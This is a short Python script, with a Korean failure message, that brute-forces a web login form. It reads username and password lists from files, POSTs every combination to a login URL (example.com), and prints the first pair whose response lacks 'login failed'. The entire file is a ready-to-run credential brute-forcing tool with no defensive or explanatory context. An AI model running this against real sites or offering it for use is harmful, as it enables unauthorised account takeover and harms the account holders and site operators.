import requests

url = "http://example.com/login"

with open("usernames.txt", "r") as f:
    usernames = [line.strip() for line in f]

with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f]


for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "login failed" not in response.text:
            print(f"[+] sucess! {username}:{password}")
            exit()
        else:
            print(f"[-] 실패: {data}")
